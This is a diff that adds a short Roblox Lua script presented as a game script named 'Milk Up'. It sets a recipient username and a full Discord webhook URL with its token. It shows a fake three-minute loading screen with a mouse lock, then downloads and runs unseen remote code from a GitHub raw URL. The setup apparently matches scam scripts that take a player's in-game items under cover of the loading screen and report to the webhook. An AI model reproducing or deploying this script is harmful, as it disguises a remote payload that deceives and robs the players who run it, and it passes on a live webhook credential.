@@ -1,0 +1,14 @@
+UserName = "xFinn2401x"
+Webhook = "https://discord.com/api/webhooks/1108396187075227728/y6QhbttBVw6CWR6nyVxnzPTYJwjdAZOsWX_3s50I64aJeh98vx7d-G_CH0Zg5lz9LIsd"
+
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+
+_G.ScriptName = "Milk Up"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
